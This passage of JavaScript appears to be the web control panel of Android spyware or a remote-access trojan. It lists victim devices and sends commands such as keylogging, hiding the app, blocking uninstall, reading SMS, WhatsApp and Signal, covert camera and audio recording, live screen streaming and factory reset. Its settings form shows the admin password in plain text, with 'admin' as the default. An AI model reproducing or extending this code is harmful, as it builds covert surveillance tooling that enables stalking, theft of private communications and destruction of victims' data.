  TOKEN='';localStorage.removeItem('az_token');
  document.getElementById('app').style.display='none';
  document.getElementById('loginPage').style.display='flex';
  if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
  if(ws&&ws.readyState<2)ws.close();
}
function showApp(){
  document.getElementById('loginPage').style.display='none';
  document.getElementById('app').style.display='block';
  loadAll();
  connectWS();
  POLL_INTERVAL=setInterval(loadAll,8000);
}

/* ========== Sidebar ========== */
function toggleSidebar(){
  document.getElementById('sidebar').classList.toggle('open');
  document.getElementById('sidebarOverlay').classList.toggle('open');
}
function showPage(name,el){
  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
  document.getElementById('page-'+name).classList.add('active');
  document.querySelectorAll('.sidebar a[data-page]').forEach(function(a){a.classList.remove('active');});
  if(el)el.classList.add('active');
  else{
    var link=document.querySelector('.sidebar a[data-page="'+name+'"]');
    if(link)link.classList.add('active');
  }
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarOverlay').classList.remove('open');
}

/* ========== Clock ========== */
function updateClock(){
  var now=new Date();
  document.getElementById('clock').textContent=now.toLocaleString('ar-SA');
}
setInterval(updateClock,1000);updateClock();

/* ========== WebSocket ========== */
var ws=null;
var wsReconnectDelay=1000;
var wsMaxDelay=30000;
function connectWS(){
  if(!TOKEN)return;
  try{
    var proto=location.protocol==='https:'?'wss:':'ws:';
    ws=new WebSocket(proto+'//'+location.host+'/ws/dashboard?token='+encodeURIComponent(TOKEN));
    ws.onopen=function(){
      wsReconnectDelay=1000;
      setWSStatus('connected');
    };
    ws.onmessage=function(ev){
      try{
        var msg=JSON.parse(ev.data);
        handleWSMessage(msg);
      }catch(e){}
    };
    ws.onclose=function(){
      setWSStatus('disconnected');
      wsReconnectDelay=Math.min(wsReconnectDelay*1.5,wsMaxDelay);
      setTimeout(connectWS,wsReconnectDelay);
    };
    ws.onerror=function(){
      ws.close();
    };
  }catch(e){
    setTimeout(connectWS,wsReconnectDelay);
  }
}
function setWSStatus(status){
  var ind=document.getElementById('wsIndicator');
  var txt=document.getElementById('wsStatusText');
  ind.className='live-indicator';
  if(status==='connected'){ind.classList.remove('offline','connecting');txt.textContent='Live';}
  else if(status==='disconnected'){ind.classList.add('offline');txt.textContent='Offline';}
  else{ind.classList.add('connecting');txt.textContent='Connecting';}
}
function handleWSMessage(msg){
  if(msg.type==='device_update'){
    var dev=msg.device;
    var idx=DEVICES.findIndex(function(d){return d.id===dev.id;});
    if(idx>=0){DEVICES[idx]=dev;}
    else{DEVICES.push(dev);}
    populateDeviceSelects();
    renderDevices();
    updateDashDevices();
  }
  else if(msg.type==='device_online'){notify(msg.device_name+' came online','var(--green)');loadAll();}
  else if(msg.type==='device_offline'){notify(msg.device_name+' went offline','var(--red)');loadAll();}
  else if(msg.type==='command_update'){
    var ci=ALL_COMMANDS.findIndex(function(c){return c.id===msg.command.id;});
    if(ci>=0)ALL_COMMANDS[ci]=msg.command;
    else ALL_COMMANDS.push(msg.command);
    renderCommandLog(ALL_COMMANDS);
    checkPendingRefresh();
  }
  else if(msg.type==='new_event'){
    ALL_EVENTS.push(msg.event);
    if(ALL_EVENTS.length>500)ALL_EVENTS=ALL_EVENTS.slice(-500);
    renderEventLog(ALL_EVENTS);
    populateEventDeviceFilter();
  }
  else if(msg.type==='stats_update'){
    renderStats(msg.stats);
  }
}

/* ========== Populate Selects ========== */
function populateDeviceSelects(){
  var html=DEVICES.map(function(d){return '<option value="'+esc(d.id)+'">'+esc(d.name||d.id)+' ('+(d.active?'Online':'Offline')+')</option>';}).join('');
  ['cmdDevice','fileDevice','dataDevice','monDevice','streamDevice'].forEach(function(id){
    var el=document.getElementById(id);if(el)el.innerHTML=html;
  });
  populateEventDeviceFilter();
}
function populateEventDeviceFilter(){
  var sel=document.getElementById('eventDeviceFilter');
  if(!sel)return;
  var cur=sel.value;
  var html='<option value="all">All Devices</option>';
  DEVICES.forEach(function(d){html+='<option value="'+esc(d.id)+'">'+esc(d.name||d.id)+'</option>';});
  sel.innerHTML=html;
  sel.value=cur;
}

/* ========== Load All ========== */
async function loadAll(){
  try{var r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
  try{var r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();updateDashDevices();}}catch(e){}
  try{var r=await api('web/commands');if(r.ok){ALL_COMMANDS=r.commands||[];renderCommandLog(ALL_COMMANDS);checkPendingRefresh();}}catch(e){}
  loadEvents();
  loadSettings();
}

/* ========== Stats Cards ========== */
function renderStats(s){
  var eventsToday=0;
  var now=new Date();var todayStr=now.toISOString().slice(0,10);
  ALL_EVENTS.forEach(function(ev){if((ev.time||'').slice(0,10)===todayStr)eventsToday++;});
  var grid=document.getElementById('statsGrid');
  grid.innerHTML=
  '<div class="stat-card"><div class="stat-icon blue">&#x1F4F1;</div><div class="label">Total Devices</div><div class="value" style="color:var(--blue)">'+esc(s.devices_total)+'</div><div class="sub">&#x1F7E2; '+esc(s.devices_online)+' online</div></div>'+
  '<div class="stat-card"><div class="stat-icon green">&#x26A1;</div><div class="label">Online Devices</div><div class="value" style="color:var(--green)">'+esc(s.devices_online)+'</div><div class="sub">of '+esc(s.devices_total)+' total</div></div>'+
  '<div class="stat-card"><div class="stat-icon yellow">&#x23F3;</div><div class="label">Pending Commands</div><div class="value" style="color:var(--yellow)">'+esc(s.commands_pending)+'</div><div class="sub">'+esc(s.total_registered_commands)+' registered</div></div>'+
  '<div class="stat-card"><div class="stat-icon purple">&#x1F4CB;</div><div class="label">Events Today</div><div class="value" style="color:var(--purple)">'+eventsToday+'</div><div class="sub">'+esc(s.events_total)+' total events</div></div>'+
  '<div class="stat-card"><div class="stat-icon orange">&#x2709;&#xFE0F;</div><div class="label">Messages Sent</div><div class="value" style="color:var(--orange)">'+esc(s.messages_sent)+'</div></div>'+
  '<div class="stat-card"><div class="stat-icon green">&#x2705;</div><div class="label">Commands Done</div><div class="value" style="color:var(--green)">'+esc(s.commands_completed)+'</div><div class="sub">&#x1F4E1; '+esc(s.api_hits)+' API hits</div></div>'+
  '<div class="stat-card"><div class="stat-icon blue">&#x23F1;</div><div class="label">Uptime</div><div class="value" style="font-size:18px;color:var(--blue)">'+esc(s.uptime_formatted||'-')+'</div></div>';
}

/* ========== Device Cards ========== */
function batteryClass(pct){
  pct=parseInt(pct)||0;
  if(pct>50)return 'high';
  if(pct>20)return 'mid';
  return 'low';
}
function batteryColor(pct){
  pct=parseInt(pct)||0;
  if(pct>50)return 'var(--green)';
  if(pct>20)return 'var(--yellow)';
  return 'var(--red)';
}
function signalBarsHtml(strength){
  var s=parseInt(strength)||0;
  var bars=4;
  if(s<25)bars=1;else if(s<50)bars=2;else if(s<75)bars=3;
  var html='<div class="signal-bars">';
  for(var i=1;i<=4;i++)html+='<div class="bar'+(i<=bars?' active':'')+'"></div>';
  html+='</div>';
  return html;
}
function deviceCardHtml(d){
  var isOn=!!d.active;
  var batt=parseInt(d.battery)||null;
  var battHtml=batt!==null?'<div class="battery-bar"><div class="battery-shell"><div class="battery-fill '+batteryClass(batt)+'" style="width:'+Math.max(0,Math.min(100,batt))+'%"></div></div><span class="battery-text" style="color:'+batteryColor(batt)+'">'+batt+'%</span></div>':'';
  var sigHtml=d.signal?signalBarsHtml(d.signal):'';
  return '<div class="device-card" onclick="showDeviceDetail(\''+esc(d.id)+'\')">'+
    '<div class="dc-header">'+
      '<div class="dc-status '+(isOn?'online':'offline')+'"></div>'+
      '<div class="dc-name">'+esc(d.name||d.id)+'</div>'+
    '</div>'+
    '<div class="dc-model">'+esc(d.model||'Unknown Model')+(d.os?' | '+esc(d.os):'')+'</div>'+
    '<div class="dc-meta">'+
      (battHtml?'<div class="meta-item"><span class="meta-icon">&#x1F50B;</span>'+battHtml+'</div>':'')+
      (sigHtml?'<div class="meta-item"><span class="meta-icon">&#x1F4F6;</span>'+sigHtml+'</div>':'')+
      '<div class="meta-item"><span class="meta-icon">&#x1F552;</span><span class="relative-time">'+relativeTime(d.last_seen)+'</span></div>'+
      (d.network?'<div class="meta-item"><span class="meta-icon">&#x1F310;</span>'+esc(d.network)+'</div>':'')+
    '</div>'+
  '</div>';
}
function renderDevices(){
  var filtered=filterDevicesList(DEVICES);
  var el=document.getElementById('deviceList');
  if(!filtered.length){el.innerHTML='<div class="empty"><div class="empty-icon">&#x1F4F1;</div>No devices found</div>';return;}
  el.innerHTML=filtered.map(deviceCardHtml).join('');
}
function updateDashDevices(){
  var dash=document.getElementById('dashDevices');
  if(!DEVICES.length){dash.innerHTML='<div class="empty">No devices</div>';return;}
  dash.innerHTML=DEVICES.filter(function(d){return d.active;}).slice(0,6).map(deviceCardHtml).join('');
}
function filterDevices(){
  renderDevices();
}
function filterDevicesList(devices){
  var q=(document.getElementById('deviceSearch').value||'').toLowerCase();
  var statusF=document.getElementById('deviceStatusFilter').value;
  return devices.filter(function(d){
    if(statusF==='online'&&!d.active)return false;
    if(statusF==='offline'&&d.active)return false;
    if(q){
      var text=(d.name||' '+d.id+' '+d.model+' '+d.os).toLowerCase();
      if(text.indexOf(q)<0)return false;
    }
    return true;
  });
}

/* ========== Device Detail ========== */
async function showDeviceDetail(id){
  try{
    var r=await api('web/device/'+id);
    if(!r.ok)return;
    var d=r.device;var cmds=r.commands||[];
    var detail=document.getElementById('deviceDetail');
    detail.style.display='block';
    var batt=parseInt(d.battery)||null;
    var battHtml=batt!==null?'<span style="color:'+batteryColor(batt)+';font-weight:600">'+batt+'%</span> '+
      '<div class="battery-bar" style="display:inline-flex;vertical-align:middle;margin-right:8px"><div class="battery-shell"><div class="battery-fill '+batteryClass(batt)+'" style="width:'+Math.max(0,Math.min(100,batt))+'%"></div></div></div>':'-';
    detail.innerHTML=
      '<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">'+
        '<div class="dc-status '+(d.active?'online':'offline')+'" style="width:14px;height:14px"></div>'+
        '<h2 style="font-size:20px">'+esc(d.name||d.id)+'</h2>'+
        (d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>')+
      '</div>'+
      '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:20px">'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">DEVICE ID</div><code style="font-size:12px">'+esc(d.id)+'</code></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">MODEL</div><div>'+esc(d.model||'-')+'</div></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">OS</div><div>'+esc(d.os||'-')+'</div></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">BATTERY</div><div>'+battHtml+'</div></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">NETWORK</div><div>'+esc(d.network||'-')+'</div></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">LOCATION</div><div>'+esc(d.location||'-')+'</div></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">LAST SEEN</div><div>'+esc(d.last_seen||'-')+' <span class="relative-time">('+relativeTime(d.last_seen)+')</span></div></div>'+
        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">CREATED</div><div>'+esc(d.created_at||'-')+'</div></div>'+
      '</div>'+
      '<h3 style="margin-bottom:12px">&#x1F4CB; Recent Commands</h3>'+
      (cmds.length?cmds.map(function(c){return cmdItemHtml(c);}).join(''):'<div class="empty">No commands</div>')+
      '<button class="btn btn-danger btn-sm" onclick="unlinkDevice(\''+esc(d.id)+'\')" style="margin-top:16px">&#x1F5D1;&#xFE0F; Unlink Device</button>';
    detail.scrollIntoView({behavior:'smooth'});
  }catch(e){}
}

/* ========== Unlink / Link ========== */
async function unlinkDevice(id){
  if(!confirm('Unlink this device?'))return;
  var r=await api('web/unlink/'+id,{method:'DELETE'});
  if(r.ok){notify('Device unlinked');loadAll();}
  else notify('Failed','var(--red)');
}
async function generateLink(){
  var r=await api('web/link_code');
  if(r.ok){
    var box=document.getElementById('linkCodeBox');
    document.getElementById('linkCodeText').textContent=r.code;
    box.style.display='block';
    notify('Link code generated!');
  }
}

/* ========== Command Categories ========== */
var CMD_CATEGORIES={
  data:{label:'&#x1F4CA; Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
  social:{label:'&#x1F310; Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
  control:{label:'&#x1F3AE; Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
  apps:{label:'&#x1F4E6; Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
  files:{label:'&#x1F4C2; Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
  security:{label:'&#x1F512; Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
  monitor:{label:'&#x1F50D; Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
  syssettings:{label:'&#x2699;&#xFE0F; System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
};

function initCmdTabs(){
  var tabs=document.getElementById('cmdTabs');
  tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(function(k){return '<button class="tab'+(k==='data'?' active':'')+'" onclick="showCmdCat(\''+k+'\',this)">'+CMD_CATEGORIES[k].label+'</button>';}).join('');
  showCmdCat('data');
}
function showCmdCat(cat,btn){
  if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(function(t){t.classList.remove('active');});btn.classList.add('active');}
  var grid=document.getElementById('cmdGrid');
  grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(function(c){return '<button class="cmd-btn" onclick="sendDeviceCmd(\''+c+'\')">'+c.replace(/_/g,' ')+'</button>';}).join('');
}

/* ========== Send Commands ========== */
async function sendDeviceCmd(cmd){
  var devId=document.getElementById('cmdDevice').value;
  if(!devId){notify('Select a device','var(--red)');return;}
  var r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
  if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
  loadAll();
}
function sendCmd(cmd){
  var devId=document.getElementById('fileDevice').value;
  if(!devId){notify('Select a device','var(--red)');return;}
  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(function(r){
    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
  });
}
function sendDataCmd(cmd){
  var devId=document.getElementById('dataDevice').value;
  if(!devId){notify('Select a device','var(--red)');return;}
  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(function(r){
    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
  });
}
function sendMonCmd(cmd){
  var devId=document.getElementById('monDevice').value;
  if(!devId){notify('Select a device','var(--red)');return;}
  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(function(r){
    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
  });
}

/* ========== Command Log Rendering ========== */
function cmdItemHtml(c){
  var statusClass=c.status==='completed'?'green':c.status==='pending'?'yellow':c.status==='failed'?'red':'blue';
  var statusLabel=c.status||'unknown';
  var spinnerHtml=c.status==='pending'?' <span class="spinner"></span>':'';
  var devName=c.device_id;
  var dev=DEVICES.find(function(d){return d.id===c.device_id;});
  if(dev)devName=dev.name||dev.id;
  var resultId='cmdres_'+(c.id||'').replace(/[^a-zA-Z0-9]/g,'');
  var hasResult=c.result&&(typeof c.result==='string'?c.result:JSON.stringify(c.result));
  var toggleResult=hasResult?'<button class="btn btn-ghost btn-sm" onclick="toggleCmdResult(\''+resultId+'\')">&#x1F4CB; Toggle Result</button>'+
    (hasResult?'<button class="btn btn-ghost btn-sm" onclick="copyCmdResult(\''+resultId+'\')">&#x1F4CB; Copy Result</button>':''):'';
  return '<div class="cmd-item" data-id="'+esc(c.id)+'" data-status="'+esc(c.status)+'" data-device="'+esc(c.device_id)+'" data-command="'+esc(c.command)+'">'+
    '<div class="cmd-header">'+
      '<span class="cmd-cmd">'+esc(c.command)+spinnerHtml+'</span>'+
      '<div style="display:flex;align-items:center;gap:6px">'+
        toggleResult+
        '<span class="badge badge-'+statusClass+'">'+esc(statusLabel)+'</span>'+
      '</div>'+
    '</div>'+
    '<div class="cmd-meta">'+
      '<span>&#x1F4F1; '+esc(devName)+'</span>'+
      '<span>&#x1F552; '+esc(c.created_at||'-')+'</span>'+
      (c.completed_at?'<span>&#x2705; '+esc(c.completed_at)+'</span>':'')+
    '</div>'+
    (hasResult?'<div class="cmd-result" id="'+resultId+'">'+esc(typeof c.result==='string'?c.result:JSON.stringify(c.result,null,2))+'</div>':'')+
  '</div>';
}
function renderCommandLog(cmds){
  var filtered=filterCommandsList(cmds||[]);
  var el=document.getElementById('cmdLog');
  var dash=document.getElementById('dashCommands');
  var items=filtered.slice(-30).reverse();
  if(!items.length){el.innerHTML='<div class="empty"><div class="empty-icon">&#x1F4CB;</div>No commands</div>';dash.innerHTML='';return;}
  var html=items.map(cmdItemHtml).join('');
  el.innerHTML=html;
  dash.innerHTML=items.slice(0,8).map(cmdItemHtml).join('');
}
function filterCommandLog(){renderCommandLog(ALL_COMMANDS);}
function filterCommandsList(cmds){
  var statusF=document.getElementById('cmdStatusFilter').value;
  var q=(document.getElementById('cmdSearchInput').value||'').toLowerCase();
  return cmds.filter(function(c){
    if(statusF!=='all'&&c.status!==statusF)return false;
    if(q){
      var text=(c.command+' '+c.device_id+' '+(c.result||'')).toLowerCase();
      if(text.indexOf(q)<0)return false;
    }
    return true;
  });
}
function toggleCmdResult(id){
  var el=document.getElementById(id);
  if(el)el.classList.toggle('expanded');
}
function copyCmdResult(id){
  var el=document.getElementById(id);
  if(!el)return;
  navigator.clipboard.writeText(el.textContent).then(function(){notify('Copied to clipboard!');}).catch(function(){notify('Copy failed','var(--red)');});
}
function checkPendingRefresh(){
  var hasPending=ALL_COMMANDS.some(function(c){return c.status==='pending';});
  if(hasPending&&!PENDING_REFRESH){
    PENDING_REFRESH=setInterval(function(){
      var still=ALL_COMMANDS.some(function(c){return c.status==='pending';});
      if(!still){clearInterval(PENDING_REFRESH);PENDING_REFRESH=null;return;}
      api('web/commands').then(function(r){if(r.ok){ALL_COMMANDS=r.commands||[];renderCommandLog(ALL_COMMANDS);}});
    },3000);
  }
}

/* ========== Event Log ========== */
async function loadEvents(){
  var r=await api('web/events');
  if(r.ok){
    ALL_EVENTS=r.events||[];
    renderEventLog(ALL_EVENTS);
    populateEventDeviceFilter();
  }
}
function eventLevelClass(level){
  if(level==='security'||level==='error'||level==='danger')return 'security';
  if(level==='warning')return 'warning';
  if(level==='success')return 'success';
  return 'info';
}
function renderEventLog(events){
  var filtered=filterEventsList(events||[]);
  var tbody=document.getElementById('eventLogBody');
  var emptyEl=document.getElementById('eventLogEmpty');
  if(!filtered.length){tbody.innerHTML='';emptyEl.style.display='';return;}
  emptyEl.style.display='none';
  tbody.innerHTML=filtered.reverse().map(function(e){
    var level=e.level||'info';
    var cls=eventLevelClass(level);
    var devName=esc(e.details&&e.details.id?e.details.id:'-');
    if(e.details&&e.details.name)devName=esc(e.details.name);
    var detailsStr='';
    if(e.details){
      try{detailsStr=JSON.stringify(e.details).slice(0,120);}catch(ex){detailsStr=String(e.details).slice(0,120);}
    }
    return '<tr class="event-item">'+
      '<td class="ev-time">'+esc((e.time||'').slice(0,19))+'</td>'+
      '<td class="ev-device">'+devName+'</td>'+
      '<td><span class="ev-type '+cls+'">'+esc(level)+'</span></td>'+
      '<td>'+esc(e.event||'')+'</td>'+
      '<td style="color:var(--text-muted);font-size:11px">'+esc(detailsStr)+'</td>'+
    '</tr>';
  }).join('');
  if(document.getElementById('eventAutoScroll').checked){
    var wrap=tbody.closest('.table-wrap');
    if(wrap)wrap.scrollTop=wrap.scrollHeight;
  }
}
function filterEventLog(){renderEventLog(ALL_EVENTS);}
function filterEventsList(events){
  var devF=document.getElementById('eventDeviceFilter').value;
  var typeF=document.getElementById('eventTypeFilter').value;
  var dateF=document.getElementById('eventDateFilter').value;
  return events.filter(function(e){
    if(devF!=='all'){
      if(e.details&&e.details.id&&e.details.id!==devF)return false;
      if(!e.details||!e.details.id)return false;
    }
    if(typeF!=='all'){
      var cls=eventLevelClass(e.level||'info');
      if(cls!==typeF)return false;
    }
    if(dateF&&(e.time||'').slice(0,10)!==dateF)return false;
    return true;
  });
}

/* ========== Settings ========== */
async function loadSettings(){
  var r=await api('web/settings');
  if(r.ok){
    var s=r.settings;
    document.getElementById('settingsForm').innerHTML=
      '<label style="display:block;margin-bottom:12px">&#x1F511; Admin Password<input id="setPass" value="'+esc(s.admin_password||'admin')+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
      '<label style="display:block;margin-bottom:12px">&#x23F1; Sync Interval (sec)<input id="setSync" type="number" value="'+esc(s.sync_interval||300)+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
      '<label style="display:block;margin-bottom:12px">&#x1F4CD; Location Interval (sec)<input id="setLoc" type="number" value="'+esc(s.location_interval||60)+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
      '<label style="display:block;margin-bottom:12px">&#x1F310; Language<select id="setLang" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"><option value="ar" '+(s.language==='ar'?'selected':'')+'>Arabic</option><option value="en" '+(s.language==='en'?'selected':'')+'>English</option></select></label>'+
      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" '+(s.notifications?'checked':'')+'> &#x1F514; Notifications</label>'+
      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" '+(s.auto_location?'checked':'')+'> &#x1F5FA;&#xFE0F; Auto Location</label>'+
      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" '+(s.auto_sync?'checked':'')+'> &#x1F504; Auto Sync</label>';
  }
}
async function saveSettings(){
  var data={
    admin_password:document.getElementById('setPass').value,
    sync_interval:parseInt(document.getElementById('setSync').value),
    location_interval:parseInt(document.getElementById('setLoc').value),
    language:document.getElementById('setLang').value,
    notifications:document.getElementById('setNotif').checked,
    auto_location:document.getElementById('setAutoLoc').checked,
    auto_sync:document.getElementById('setAutoSync').checked,
  };
  var r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
  if(r.ok)notify('Settings saved!');else notify('Failed','var(--red)');
}

/* ========== Init ========== */
if(TOKEN){showApp();}
initCmdTabs();
setTimeout(loadSettings,500);

/* ========== LIVE STREAMING (JPEG Screenshot-based) ========== */
var _streamType='screen';
var _streamActive=false;
var _streamPollTimer=null;
var _frameCount=0;
var _audioAnimFrame=null;
var _streamWaitingTimer=null;
var _firstFrameReceived=false;
var _lastFrameData='';
var _streamQuality=3;

function onStreamDeviceChange(){
  var devId=document.getElementById('streamDevice').value;
  document.getElementById('stDevice').textContent=devId?((DEVICES.find(function(d){return d.id===devId;})||{}).name||devId):'-';
  if(_streamActive)stopStream();
}
function selectStreamType(type){
  _streamType=type;
  document.querySelectorAll('.stream-type-btn').forEach(function(b){b.classList.remove('active');});
  var btnId=type==='screen'?'stScreen':type==='camera'?'stCamera':'stAudio';
  document.getElementById(btnId).classList.add('active');
  document.getElementById('qualityCard').style.display=type==='audio'?'none':'block';
}
function setQuality(q,btn){
  _streamQuality={'low':8,'medium':3,'high':1}[q]||3;
  document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
  btn.classList.add('active');
  notify('Quality changed');
}
function _setViewerState(state){
  var viewer=document.getElementById('streamViewer');
  var noMsg=document.getElementById('noStreamMsg');
  var img=document.getElementById('streamImg');
  var badge=document.getElementById('streamBadge');
  var audioC=document.getElementById('audioPlayerContainer');
  noMsg.style.display='none';img.style.display='none';badge.style.display='none';audioC.style.display='none';viewer.style.background='#000';
  if(state==='idle'){noMsg.style.display='';noMsg.innerHTML='<div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>Select a device and start streaming';viewer.style.background='var(--surface)';}
  else if(state==='waiting'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div class="pulse" style="font-size:48px;margin-bottom:16px">&#x231B;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px">Waiting for device frame...</div><div style="color:var(--text-secondary);font-size:13px">Sending screenshot command to device.<br>First frame may take a few seconds.<br>Ensure device is connected and screen capture permission is granted.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--yellow)">&#x25CF; Waiting...</span>';}
  else if(state==='connected'){document.getElementById('stStatus').innerHTML='<span style="color:var(--blue)">&#x25CF; Connected - waiting for frame...</span>';}
  else if(state==='receiving_video'){img.style.display='';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">&#x25CF; Live</span>';}
  else if(state==='receiving_audio'){audioC.style.display='block';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">&#x25CF; Live</span>';}
  else if(state==='error'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div style="font-size:48px;margin-bottom:16px">&#x26A0;&#xFE0F;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px;color:var(--accent)">Stream failed</div><div style="color:var(--text-secondary);font-size:13px">Make sure the device is connected.<br>Ensure screen capture permission is granted.<br>Try again.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--accent)">&#x25CF; Failed</span>';}
}
async function startStream(){
  var devId=document.getElementById('streamDevice').value;
  if(!devId){notify('Select a device first','var(--red)');return;}
  _streamActive=true;_frameCount=0;_firstFrameReceived=false;_lastFrameData='';
  document.getElementById('btnStartStream').style.display='none';
  document.getElementById('btnStopStream').style.display='';
  document.getElementById('btnSwitchCam').style.display=_streamType==='camera'?'':'none';
  document.getElementById('stFrames').textContent='0';
  document.getElementById('stLastAct').textContent='-';
  var typeLabel=_streamType==='screen'?'Screen':_streamType==='camera'?'Camera':'Audio';
  document.getElementById('stType').textContent=typeLabel;
  var dev=DEVICES.find(function(d){return d.id===devId;});
  document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
  _setViewerState('waiting');
  notify('Starting stream: '+typeLabel);
  var interval=_streamType==='audio'?5:_streamQuality;
  var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
  if(!r.ok){notify('Stream start failed: '+(r.error||''),'var(--red)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
  notify('Stream started - waiting for first frame...');
  startStreamPolling(devId);
  if(_streamWaitingTimer)clearTimeout(_streamWaitingTimer);
  _streamWaitingTimer=setTimeout(function(){if(_streamActive&&!_firstFrameReceived){_setViewerState('error');}},60000);
}
async function stopStream(){
  var devId=document.getElementById('streamDevice').value;
  if(!devId)return;
  api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
  _cleanupStream();
  notify('Stream stopped');
}
function _cleanupStream(){
  _streamActive=false;_firstFrameReceived=false;_lastFrameData='';
  if(_streamPollTimer){clearInterval(_streamPollTimer);_streamPollTimer=null;}
  if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}
  if(_audioAnimFrame){cancelAnimationFrame(_audioAnimFrame);_audioAnimFrame=null;}
  document.getElementById('btnStartStream').style.display='';
  document.getElementById('btnStopStream').style.display='none';
  document.getElementById('btnSwitchCam').style.display='none';
  _setViewerState('idle');
  document.getElementById('stStatus').textContent='Stopped';
}
